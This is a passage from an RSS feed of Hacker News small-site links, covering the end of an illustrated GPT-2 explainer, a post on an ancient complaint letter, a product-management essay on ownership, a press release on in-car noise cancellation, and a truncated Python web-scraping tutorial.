<h4 id="the-encoder-block">The Encoder Block</h4>

<p>First is the encoder block:</p>

<p><img src="http://jalammar.github.io/images/xlnet/transformer-encoder-block-2.png">
  <br>
  An encoder block from the original transformer paper can take inputs up until a certain max sequence length (e.g. 512 tokens). It's okay if an input sequence is shorter than this limit, we can just pad the rest of the sequence.
</p>

<h4 id="the-decoder-block">The Decoder Block</h4>
<p>Second, there’s the decoder block which has a small architectural variation from the encoder block – a layer to allow it to pay attention to specific segments from the encoder:</p>

<p><img src="http://jalammar.github.io/images/xlnet/transformer-decoder-block-2.png">
  <br>
</p>

<p>One key difference in the self-attention layer here, is that it masks future tokens – not by changing the word to [mask] like BERT, but by interfering in the self-attention calculation blocking information from tokens that are to the right of the position being calculated.</p>

<p>If, for example, we’re to highlight the path of position #4, we can see that it is only allowed to attend to the present and previous tokens:</p>

<p><img src="http://jalammar.github.io/images/xlnet/transformer-decoder-block-self-attention-2.png">
  <br>
</p>

<p>It’s important that the distinction between self-attention (what BERT uses) and masked self-attention (what GPT-2 uses) is clear. A normal self-attention block allows a position to peak at tokens to its right. Masked self-attention prevents that from happening:</p>

<p><img src="http://jalammar.github.io/images/gpt2/self-attention-and-masked-self-attention.png">
  <br>
</p>

<h4 id="the-decoder-only-block">The Decoder-Only Block</h4>
<p>Subsequent to the original paper, <a href="https://arxiv.org/pdf/1801.10198.pdf">Generating Wikipedia by Summarizing Long Sequences</a> proposed another arrangement of the transformer block that is capable of doing language modeling. This model threw away the Transformer encoder. For that reason, let’s call the model the “Transformer-Decoder”. This early transformer-based language model was made up of a stack of six transformer decoder blocks:</p>

<p><img src="http://jalammar.github.io/images/xlnet/transformer-decoder-intro.png">
  <br>
  The decoder blocks are identical. I have expanded the first one so you can see its self-attention layer is the masked variant. Notice that the model now can address up to 4,000 tokens in a certain segment -- a massive upgrade from the 512 in the original transformer.
</p>

<p>These blocks were very similar to the original decoder blocks, except they did away with that second self-attention layer. A similar architecture was examined in <a href="https://arxiv.org/pdf/1808.04444.pdf">Character-Level Language Modeling with Deeper Self-Attention</a> to create a language model that predicts one letter/character at a time.</p>

<p>The OpenAI GPT-2 model uses these decoder-only blocks.</p>

<h3 id="crash-course-in-brain-surgery-looking-inside-gpt-2">Crash Course in Brain Surgery: Looking Inside GPT-2</h3>

<blockquote>
  <p>Look inside and you will see,
The words are cutting deep inside my brain.
Thunder burning, quickly burning,
Knife of words is driving me insane, insane yeah.
~<strong><a href="https://en.wikipedia.org/wiki/Budgie_(band)">Budgie</a></strong></p>

</blockquote>

<p>Let’s lay a trained GPT-2 on our surgery table and look at how it works.</p>

<p><img src="http://jalammar.github.io/images/gpt2/gpt-2-layers-2.png">
  <br>
  The GPT-2 can process 1024 tokens. Each token flows through all the decoder blocks along its own path.
</p>

<p>The simplest way to run a trained GPT-2 is to allow it to ramble on its own (which is technically called <em>generating unconditional samples</em>) – alternatively, we can give it a prompt to have it speak about a certain topic (a.k.a generating <em>interactive conditional samples</em>). In the rambling case, we can simply hand it the start token and have it start generating words (the trained model uses <code>&lt;|endoftext|&gt;</code> as its start token. Let’s call it <code>&lt;s&gt;</code> instead).</p>

<div>
  <p><img src="http://jalammar.github.io/images/gpt2/gpt2-simple-output-2.gif"></p>
</div>

<p>The model only has one input token, so that path would be the only active one. The token is processed successively through all the layers, then a vector is produced along that path. That vector can be scored against the model’s vocabulary (all the words the model knows, 50,000 words in the case of GPT-2). In this case we selected the token with the highest probability, ‘the’. But we can certainly mix things up – you know how if you keep clicking the suggested word in your keyboard app, it sometimes can stuck in repetitive loops where the only way out is if you click the second or third suggested word. The same can happen here. GPT-2 has a parameter called top-k that we can use to have the model consider sampling words other than the top word (which is the case when top-k = 1).</p>

<p>In the next step, we add the output from the first step to our input sequence, and have the model make its next prediction:</p>

<p><img src="http://jalammar.github.io/images/gpt2/gpt-2-simple-output-3.gif">
  <br>
</p>

<p>Notice that the second path is the only that’s active in this calculation. Each layer of GPT-2 has retained its own interpretation of the first token and will use it in processing the second token (we’ll get into more detail about this in the following section about self-attention). GPT-2 does not re-interpret the first token in light of the second token.</p>

<h3 id="a-deeper-look-inside">A Deeper Look Inside</h3>

<h4 id="input-encoding">Input Encoding</h4>
<p>Let’s look at more details to get to know the model more intimately. Let’s start from the input. As in other NLP models we’ve discussed before, the model looks up the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://jalammar.github.io/illustrated-gpt2/">http://jalammar.github.io/illustrated-gpt2/</a></em></p>]]>
            </description>
            <link>http://jalammar.github.io/illustrated-gpt2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027205</guid>
            <pubDate>Sun, 08 Nov 2020 17:23:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interview with Paul Biggar (video interview on moving Dark from OCaml to F#)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026998">thread link</a>) | @DanielBMarkham
<br/>
November 8, 2020 | https://danielbmarkham.locals.com/post/210794/interview-paul-biggar | <a href="https://web.archive.org/web/*/https://danielbmarkham.locals.com/post/210794/interview-paul-biggar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
                    <p>
                Random (history) Earliest Complaint Letter            </p>
                    <div>
                 <p>From 3800 years ago we haver the first angry complaint letter.</p>
<p>Nanni bought some copper ingots from Ea-nasir, but the copper that showed up was poor quality, and the customer service was terrible.</p>
<p>Nanni tells Ea-nasir that he's not taking any more crap copper from the bozo. </p>
<p>He wants his money back. And next time Ea-nassir tries to pull that stunt, he's shipping the whole thing back. </p>
<p>No word on how Ea-nasir replied. The letter was "written" by hammering cuneiform on to a stone tablet. The 5x5x1 stone tablet probably weighed over 20 pounds.</p>
<p>Wonder what the postage on that was?</p>            </div>
                    </div>

            </div></div>]]>
            </description>
            <link>https://danielbmarkham.locals.com/post/210794/interview-paul-biggar</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026998</guid>
            <pubDate>Sun, 08 Nov 2020 16:55:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Ownership Is Important for Great Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026963">thread link</a>) | @justanotherpm
<br/>
November 8, 2020 | https://blog.justanotherpm.com/why-is-ownership-such-an-important-quality-for-great-product-managers-5-reasons/ | <a href="https://web.archive.org/web/*/https://blog.justanotherpm.com/why-is-ownership-such-an-important-quality-for-great-product-managers-5-reasons/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
            <p>Close your eyes and think about these situations:</p><p>Situation one: Imagine you are on your way to work on a Monday morning. You take the regular metro (or subway or bus), which is extremely crowded. Five minutes after you get in, you notice that an older woman loses her balance and falls. She gets hurt and is crying in pain. By the looks, it might be a severe injury.</p><p>What would you do?</p><p>Before you read on, please take a second to visualize what you would do for the older woman.</p><p>Situation two- It is the same as above. The only difference is that the injured person is not an older stranger, but one of your parents.</p><p>What would you do now? Would it be any different from the first situation?</p><p>I believe that a lot of people would help the older woman from the first situation to a certain extent. Maybe they take her to the closest hospital, or they call the emergency services, or they call someone from her phone. And the situation would end there.</p><p>In the second case, most would probably take their parent to the hospital, take the day off from work, and stay with their parent until they get the necessary treatment and recover fully.</p><p>As expected, the level of <em>ownership</em> is much higher in the second case compared to the first.</p><p>In the first instance, the person worked towards a short term goal or an instant output - get the injured person immediate help. In the second case, the person fought for a longer-term goal and an <em>outcome - </em>help the parent get <em>whatever</em> they need to recover.</p><p>The above set of actions sound apparent, because in one situation, the wounded is a stranger, and in the second, they are a parent. But that is not the point. The point is that the same person can operate at different levels of ownership depending on how much they care about the outcome.</p><p>Great product managers genuinely care about the problems they solve and the solutions they deliver. Great product managers also have an exceptionally high level of ownership.</p><p>Let us understand the advantages of being a high ownership PM:</p><ol><li><strong>Confidence and trust. </strong>Direct manager, peers, and seniors will have very high confidence in those who consistently own and deliver results. They will be the most coveted team member or leader for critical and complex tasks.</li><li><strong>Better decision making. </strong>High ownership individuals have the "do whatever it takes" attitude. Getting things done requires excellent decision making. PMs who are ownership driven create systems and processes to enable and improve their decisions.</li><li><strong>Bigger and stronger network.</strong> Most business-critical decisions require alignment across multiple leaders and teams. High ownership PMs build and leverage relationships to expedite the process of making difficult decisions.</li><li><strong>Create a positive and happy culture in the organization. </strong>Great PMs are self-motivated and deliver positive results, which builds a success-driven culture - something that every employer desires.</li><li><strong>Create a meaningful and visible impact. </strong>As long as PMs are working on the right tasks - which great PMs always do - their work will create a positive impact on their team and the organization.</li></ol><p>At this stage, you might be asking yourself - "How do I become (more) ownership driven?" And, we have the answer to that question, which I will share in the next post.</p><p>For now, I leave you with one of Gary W. Keller's quote, that summarizes the importance of <em>ownership</em>.</p><blockquote>Taking complete ownership of your outcomes by holding no one but yourself responsible for them is the most powerful thing you can do to drive your success.</blockquote>
    </div>
        
</article>                    
                </main>
</div>
        </div></div>]]>
            </description>
            <link>https://blog.justanotherpm.com/why-is-ownership-such-an-important-quality-for-great-product-managers-5-reasons/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026963</guid>
            <pubDate>Sun, 08 Nov 2020 16:51:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How active noise cancellation for automotive works]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 65 (<a href="https://news.ycombinator.com/item?id=25026841">thread link</a>) | @giuliomagnifico
<br/>
November 8, 2020 | https://www.silentium.com/advanced-broad-band-active-noise-cancellation-now-available-in-cars/ | <a href="https://web.archive.org/web/*/https://www.silentium.com/advanced-broad-band-active-noise-cancellation-now-available-in-cars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="mk-page-id-6588">
					<div itemprop="mainEntityOfPage">
							
	<article id="6588" itemscope="itemscope" itemprop="blogPost" itemtype="http://schema.org/BlogPosting">

	<div><p><a title="Advanced, broad-band active noise cancellation now available in cars" href="https://www.silentium.com/wp-content/uploads/2020/11/silentium-anc-system.jpg">&nbsp;</a><img alt="Advanced, broad-band active noise cancellation now available in cars" title="Advanced, broad-band active noise cancellation now available in cars" src="https://www.silentium.com/wp-content/uploads/bfi_thumb/dummy-transparent-oj3yxgsoeorp9werpevcwqrlmj5p4y57n6vjhiqmq0.png" data-mk-image-src-set="{&quot;default&quot;:&quot;https://www.silentium.com/wp-content/uploads/2020/11/silentium-anc-system.jpg&quot;,&quot;2x&quot;:&quot;&quot;,&quot;mobile&quot;:&quot;&quot;,&quot;responsive&quot;:&quot;true&quot;}" width="800" height="500" itemprop="image"></p></div>				
	





<div itemprop="mainEntityOfPage">
	<p>Silentium has introduced advanced, broad-band active road noise cancellation to the auto industry for the first time.</p>
<p>After several years in development, Jaguar and Land Rover are the first carmakers to integrate Silentium’s ‘Active Acoustics’ software in three of their new vehicles, meaning the technology is now available for car buyers to experience. Active road noise cancellation removes 90% of unwanted noise across a broad band of frequencies – from 20Hz up to 1kHz – providing a quieter and more refined experience for occupants, and therefore preventing driver fatigue.</p>
<p>In addition to wellbeing benefits, Silentium’s Active Acoustics technology offers vehicle manufacturers a way to reduce their reliance on costly passive noise damping and insulation materials, and reduce vehicle weight – an increasingly important R&amp;D factor as the industry enters a new era of electro-mobility.</p>
<p>Anthony Manias, Head of Automotive at Silentium, commented: “<em>Active Acoustics will change the way car manufacturers reduce, cancel and enhance sound inside their vehicles, and how customers perceive and interact with these sounds. Silentium has proven that it can make broadband in-car noise cancellation work – now the duty is on carmakers to adopt the technology and ensure their customers can enjoy the benefits.”</em></p>
<p><img src="https://www.silentium.com/wp-content/uploads/2020/11/graphic-silentium1.jpg" alt="" width="1000" height="756" srcset="https://www.silentium.com/wp-content/uploads/2020/11/graphic-silentium1.jpg 1000w, https://www.silentium.com/wp-content/uploads/2020/11/graphic-silentium1-300x227.jpg 300w, https://www.silentium.com/wp-content/uploads/2020/11/graphic-silentium1-768x581.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></p>
<p><strong>How active noise cancellation works</strong></p>
<p>Silentium’s industry-first technology is similar to that found in a pair of high-end noise-cancelling headphones, but more advanced as it manipulates a larger amount of air. Up to six strategically positioned accelerometers on a vehicle’s chassis monitor unwanted road noise and send a signal to an on-board control unit with Silentium’s software, which plays an equivalent anti-noise signal through the vehicle’s speaker system. The pressure waves from both the unwanted exterior noise and manufactured anti-noise reach occupants’ eardrums at exactly the same time and cancel each other out.</p>
<p>Silentium’s Active Acoustics software can reduce, cancel and enhance sound inside any vehicle, improving occupant comfort, safety and wellbeing, and creating a more enjoyable environment for all.</p>
<p><iframe title="Silentium Active Acoustics on road noise" width="1140" height="641" src="https://www.youtube.com/embed/5x9NEpfRZuc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p><iframe title="Silentium Active Acoustics with road noise and music" width="1140" height="641" src="https://www.youtube.com/embed/uDzSkaWBD7E?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
</div>



</article>

							
											</div>
										
				</div>
			</div></div>]]>
            </description>
            <link>https://www.silentium.com/advanced-broad-band-active-noise-cancellation-now-available-in-cars/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026841</guid>
            <pubDate>Sun, 08 Nov 2020 16:35:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to scraping in Python using BeautifulSoup and Requests]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026820">thread link</a>) | @ahmedbesbes
<br/>
November 8, 2020 | https://www.ahmedbesbes.com/case-studies/introduction-to-scraping | <a href="https://web.archive.org/web/*/https://www.ahmedbesbes.com/case-studies/introduction-to-scraping">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><section><div><div><iframe title="//www.youtube.com/embed/7Odi2_u-yDk/?modestbranding=1&amp;showinfo=0&amp;autohide=1&amp;rel=0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope" allowfullscreen=""></iframe></div></div></section><section><section><article><p>A lot of people at different levels of an organization may need to collect external data from the internet for various
reasons: analyzing the competition, aggregating news feeds to follow trends in particular markets, or collecting daily
stock prices to build predictive models…</p>
<p>Whether you’re a data scientist or a business analyst, you may be in this situation from time to time and ask yourself
this ever-lasting question: <strong>How can I possibly extract this website’s data to conduct market analysis?</strong></p>
<p>One possible free way to extract website data and structure it is scraping. In this post, you’ll learn about data
scraping and how to easily build your first scraper in python.</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/fa92b/overview.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="scraping workflow" title="scraping workflow" src="https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/b9e4f/overview.png" srcset="https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/cf440/overview.png 148w,
https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/d2d38/overview.png 295w,
https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/b9e4f/overview.png 590w,
https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/f9b6a/overview.png 885w,
https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/2d849/overview.png 1180w,
https://www.ahmedbesbes.com/static/38ec94ad3cb38732209157e7db2bd131/fa92b/overview.png 1400w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>scraping workflow</figcaption>
  </figure>
<h3 id="1---What-is-data-scraping-🧹"><a href="#1---What-is-data-scraping-%F0%9F%A7%B9" aria-label="1   What is data scraping 🧹 permalink"></a>1 - What is data scraping? 🧹</h3>
<p>Let me spare you long definitions.</p>
<p>Broadly speaking, data scraping is the process of extracting a website’s data programmatically and structuring it
according to one’s needs. Many companies are using data scraping to gather external data and support their business
operations: this is currently a common practice in multiple fields.</p>
<h4 id="What-do-I-need-to-know-to-learn-data-scraping-in-python"><a href="#What-do-I-need-to-know-to-learn-data-scraping-in-python" aria-label="What do I need to know to learn data scraping in python permalink"></a>What do I need to know to learn data scraping in python?</h4>
<p>Not much. To build small scrapers, you’ll have to be a little bit familiar with Python and HTML syntaxes.</p>
<p>To build scalable and industrial scrapers, you’ll need to know one or two frameworks such as
<a href="https://scrapy.org/">Scrapy</a> or <a href="https://www.selenium.dev/">Selenium</a>.</p>
<h3 id="2---Build-your-first-scraper-in-Python"><a href="#2---Build-your-first-scraper-in-Python" aria-label="2   Build your first scraper in Python permalink"></a>2 - Build your first scraper in Python</h3>
<h4 id="Setup-your-environment"><a href="#Setup-your-environment" aria-label="Setup your environment permalink"></a>Setup your environment</h4>
<p>Let’s learn how to turn a website into structured data! To do this, you’ll first need to install the following
libraries:</p>
<ul>
<li><strong><a href="https://requests.readthedocs.io/en/master/">requests</a></strong>: to simulate HTTP requests like GET and POST. We’ll mainly
use it to access the source page of any given website.</li>
<li><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/">BeautifulSoup</a></strong>: to parse HTML and XML data very easily</li>
<li><strong><a href="https://lxml.de/">lxml</a></strong>: to increase the parsing speed of XML files</li>
<li><strong><a href="https://pandas.pydata.org/">pandas</a></strong>: to structure the data in dataframes and export it in the format of your
choice (JSON, Excel, CSV, etc.)</li>
</ul>
<p>If you’re using <a href="https://www.anaconda.com/">Anaconda</a>, you should be good to go: all these packages are already
installed. Otherwise, you should run the following commands:</p>
<div data-language="shell"><pre><code>pip <span>install</span> requests
pip <span>install</span> beautifulsoup4
pip <span>install</span> lxml
pip <span>install</span> pandas</code></pre></div>
<p>To make people easily follow along with my video tutorial, I also used a jupyter notebook to make the process
interactive.</p>
<h4 id="What-website-and-data-are-we-going-to-scrape"><a href="#What-website-and-data-are-we-going-to-scrape" aria-label="What website and data are we going to scrape permalink"></a>What website and data are we going to scrape?</h4>
<p>One friend of mine asked me if I could help him scrape this
<a href="https://www.premiumbeautynews.com/fr/marches-tendances/">website</a>. So I decided to do it in a tutorial.</p>
<p>This website is called <strong>Premium Beauty News</strong>. It publishes recent trends in the beauty market. If you look at the
front page, you’ll see that the articles that we want to scrape are organized in a grid.</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/9e57d/headlines.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="article headlines" title="article headlines" src="https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/b9e4f/headlines.png" srcset="https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/cf440/headlines.png 148w,
https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/d2d38/headlines.png 295w,
https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/b9e4f/headlines.png 590w,
https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/f9b6a/headlines.png 885w,
https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/2d849/headlines.png 1180w,
https://www.ahmedbesbes.com/static/8ee4ebfa1ffdbac2e07b0f7485e1b408/9e57d/headlines.png 1246w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>article headlines</figcaption>
  </figure>
<p>Over multiple pages:</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/57f9cb769fec6b677d700d6e14505fce/a8200/pages.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="pagination" title="pagination" src="https://www.ahmedbesbes.com/static/57f9cb769fec6b677d700d6e14505fce/b9e4f/pages.png" srcset="https://www.ahmedbesbes.com/static/57f9cb769fec6b677d700d6e14505fce/cf440/pages.png 148w,
https://www.ahmedbesbes.com/static/57f9cb769fec6b677d700d6e14505fce/d2d38/pages.png 295w,
https://www.ahmedbesbes.com/static/57f9cb769fec6b677d700d6e14505fce/b9e4f/pages.png 590w,
https://www.ahmedbesbes.com/static/57f9cb769fec6b677d700d6e14505fce/a8200/pages.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>pagination</figcaption>
  </figure>
<p>Of course, we won’t extract the header of each article appearing on these pages only. We’ll go inside each post and grab
everything we need:</p>
<p>the <strong>title</strong>, the <strong>date</strong>, the <strong>abstract</strong>:</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/a8c15d8b0c86256d24facdba8e4dcdef/a8200/metadata.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="metadata" title="metadata" src="https://www.ahmedbesbes.com/static/a8c15d8b0c86256d24facdba8e4dcdef/b9e4f/metadata.png" srcset="https://www.ahmedbesbes.com/static/a8c15d8b0c86256d24facdba8e4dcdef/cf440/metadata.png 148w,
https://www.ahmedbesbes.com/static/a8c15d8b0c86256d24facdba8e4dcdef/d2d38/metadata.png 295w,
https://www.ahmedbesbes.com/static/a8c15d8b0c86256d24facdba8e4dcdef/b9e4f/metadata.png 590w,
https://www.ahmedbesbes.com/static/a8c15d8b0c86256d24facdba8e4dcdef/a8200/metadata.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>metadata</figcaption>
  </figure>
<p>And of course the remaining <strong>full content</strong> of the post.</p>
<h3 id="Show-me-the-code"><a href="#Show-me-the-code" aria-label="Show me the code permalink"></a>Show me the code!</h3>
<p>Because that’s why you’re here, right?</p>
<p>Basic imports first:</p>
<div data-language="python"><pre><code><span>import</span> requests
<span>from</span> bs4 <span>import</span> BeautifulSoup
<span>import</span> pandas <span>as</span> pd
<span>from</span> tqdm <span>import</span> tqdm_notebook</code></pre></div>
<p>I usually define a function to parse the content of each page given its URL. This function will be called multiple
times. Let’s call it <strong>parse_url</strong>:</p>
<div data-language="python"><pre><code><span>def</span> <span>parse_url</span><span>(</span>url<span>)</span><span>:</span>
    response <span>=</span> requests<span>.</span>get<span>(</span>url<span>)</span>
    content <span>=</span> response<span>.</span>content
    parsed_response <span>=</span> BeautifulSoup<span>(</span>content<span>,</span> <span>"lxml"</span><span>)</span>
    <span>return</span> parsed_response</code></pre></div>
<h4 id="Extracting-each-post-data-and-metadata"><a href="#Extracting-each-post-data-and-metadata" aria-label="Extracting each post data and metadata permalink"></a>Extracting each post data and metadata</h4>
<p>I will first start by defining a function that extracts the data of each post (the title, date, abstract, etc) given its
URL. Then we’ll later call this function inside a for loop that goes over all the pages.</p>
<p>To build our scraper, we first have to understand the underlying HTML logic and structure of the page. Let’s start by
extracting the title of the post.</p>
<p>By inspecting this element on Chrome inspector:</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/4fbd9fabd279423673553a46b7b6776d/a8200/title.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="title of the post" title="title of the post" src="https://www.ahmedbesbes.com/static/4fbd9fabd279423673553a46b7b6776d/b9e4f/title.png" srcset="https://www.ahmedbesbes.com/static/4fbd9fabd279423673553a46b7b6776d/cf440/title.png 148w,
https://www.ahmedbesbes.com/static/4fbd9fabd279423673553a46b7b6776d/d2d38/title.png 295w,
https://www.ahmedbesbes.com/static/4fbd9fabd279423673553a46b7b6776d/b9e4f/title.png 590w,
https://www.ahmedbesbes.com/static/4fbd9fabd279423673553a46b7b6776d/a8200/title.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>title of the post</figcaption>
  </figure>
<p>we notice that the title appears inside an <strong>h1</strong> of the class <strong>“article-title”</strong>. After extracting the content of the
page using BeautifulSoup, extracting the title can be done using the <strong>find method</strong>.</p>
<div data-language="python"><pre><code>title <span>=</span> soup_post<span>.</span>find<span>(</span><span>"h1"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"article-title"</span><span>}</span><span>)</span><span>.</span>text</code></pre></div>
<p>Let’s now look at the date:</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/e0c41610dab1b93cf1c5893af9e5393a/a8200/date.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="date of the post" title="date of the post" src="https://www.ahmedbesbes.com/static/e0c41610dab1b93cf1c5893af9e5393a/b9e4f/date.png" srcset="https://www.ahmedbesbes.com/static/e0c41610dab1b93cf1c5893af9e5393a/cf440/date.png 148w,
https://www.ahmedbesbes.com/static/e0c41610dab1b93cf1c5893af9e5393a/d2d38/date.png 295w,
https://www.ahmedbesbes.com/static/e0c41610dab1b93cf1c5893af9e5393a/b9e4f/date.png 590w,
https://www.ahmedbesbes.com/static/e0c41610dab1b93cf1c5893af9e5393a/a8200/date.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>date of the post</figcaption>
  </figure>
<p>The date appears inside a <strong>span</strong>, which itself appears inside a <strong>header</strong> of the class <strong>“row sub-header”</strong>.
Translating this into code is quite easy using BeautifulSoup:</p>
<div data-language="python"><pre><code>datetime <span>=</span> soup_post<span>.</span>find<span>(</span><span>"header"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"row sub-  header"</span><span>}</span><span>)</span><span>.</span>find<span>(</span><span>"span"</span><span>)</span><span>[</span><span>"datetime"</span><span>]</span></code></pre></div>
<p>Regarding the abstract:</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/0ba4d9f58e026e44a5c254ff17d74cc3/a8200/abstract.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="abstract of the post" title="abstract of the post" src="https://www.ahmedbesbes.com/static/0ba4d9f58e026e44a5c254ff17d74cc3/b9e4f/abstract.png" srcset="https://www.ahmedbesbes.com/static/0ba4d9f58e026e44a5c254ff17d74cc3/cf440/abstract.png 148w,
https://www.ahmedbesbes.com/static/0ba4d9f58e026e44a5c254ff17d74cc3/d2d38/abstract.png 295w,
https://www.ahmedbesbes.com/static/0ba4d9f58e026e44a5c254ff17d74cc3/b9e4f/abstract.png 590w,
https://www.ahmedbesbes.com/static/0ba4d9f58e026e44a5c254ff17d74cc3/a8200/abstract.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>abstract of the post</figcaption>
  </figure>
<p>it looks like it’s contained in an <strong>h2</strong> tag of the class “article-intro”.</p>
<div data-language="python"><pre><code>abstract <span>=</span> soup_post<span>.</span>find<span>(</span><span>"h2"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"article-intro"</span><span>}</span><span>)</span><span>.</span>text</code></pre></div>
<p>Now, what about the full content of the post? It’s actually pretty easy to extract. This content is spread over multiple
paragraphs <strong>(p tags)</strong> inside a <strong>div</strong> of the class <strong>“article-text”.</strong></p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/20d71ac723a723d44610cd1b335313d9/a8200/content.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="content of the post" title="content of the post" src="https://www.ahmedbesbes.com/static/20d71ac723a723d44610cd1b335313d9/b9e4f/content.png" srcset="https://www.ahmedbesbes.com/static/20d71ac723a723d44610cd1b335313d9/cf440/content.png 148w,
https://www.ahmedbesbes.com/static/20d71ac723a723d44610cd1b335313d9/d2d38/content.png 295w,
https://www.ahmedbesbes.com/static/20d71ac723a723d44610cd1b335313d9/b9e4f/content.png 590w,
https://www.ahmedbesbes.com/static/20d71ac723a723d44610cd1b335313d9/a8200/content.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>content of the post</figcaption>
  </figure>
<p>Instead of going through each individual <strong>p tag</strong>, extracting its text, and then concatenating all the texts,
BeautifulSoup can extract the full text in one way like this:</p>
<div data-language="python"><pre><code>content <span>=</span> soup_post<span>.</span>find<span>(</span><span>"div"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"article-text"</span><span>}</span><span>)</span><span>.</span>text</code></pre></div>
<p>Let’s package everything in a single function:</p>
<div data-language="python"><pre><code><span>def</span> <span>extract_post_data</span><span>(</span>post_url<span>)</span><span>:</span>
    soup_post <span>=</span> parse_url<span>(</span>post_url<span>)</span>

    title <span>=</span> soup_post<span>.</span>find<span>(</span><span>"h1"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"article-title"</span><span>}</span><span>)</span><span>.</span>text
    datetime <span>=</span> soup_post<span>.</span>find<span>(</span><span>"header"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"row sub-header"</span><span>}</span><span>)</span><span>.</span>find<span>(</span><span>"span"</span><span>)</span><span>[</span><span>"datetime"</span><span>]</span>
    abstract <span>=</span> soup_post<span>.</span>find<span>(</span><span>"h2"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"article-intro"</span><span>}</span><span>)</span><span>.</span>text
    content <span>=</span> soup_post<span>.</span>find<span>(</span><span>"div"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"article-text"</span><span>}</span><span>)</span><span>.</span>text

    data <span>=</span> <span>{</span>
        <span>"title"</span><span>:</span> title<span>,</span>
        <span>"datetime"</span><span>:</span> datetime<span>,</span>
        <span>"abstract"</span><span>:</span> abstract<span>,</span>
        <span>"content"</span><span>:</span> content<span>,</span>
        <span>"url"</span><span>:</span> post_url
    <span>}</span>

    <span>return</span> data</code></pre></div>

<p>If we inspect the source of the home page, where articles are shown with their headlines,</p>
<figure>
    <span>
